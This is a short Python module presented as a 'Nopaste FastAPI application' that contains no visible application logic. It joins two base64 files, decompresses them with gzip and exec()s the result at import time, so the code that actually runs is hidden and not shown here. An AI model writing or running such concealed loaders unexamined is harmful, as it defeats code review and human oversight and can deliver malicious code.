"""Nopaste FastAPI application."""
from __future__ import annotations

import base64
import gzip
from pathlib import Path

_dir = Path(__file__).resolve().parent
_payload = (_dir / "main_payload_a.b64").read_text() + (_dir / "main_payload_b.b64").read_text()
exec(
    compile(
        gzip.decompress(base64.b64decode(_payload)),
        str(Path(__file__).resolve()),
        "exec",
    ),
    globals(),
)
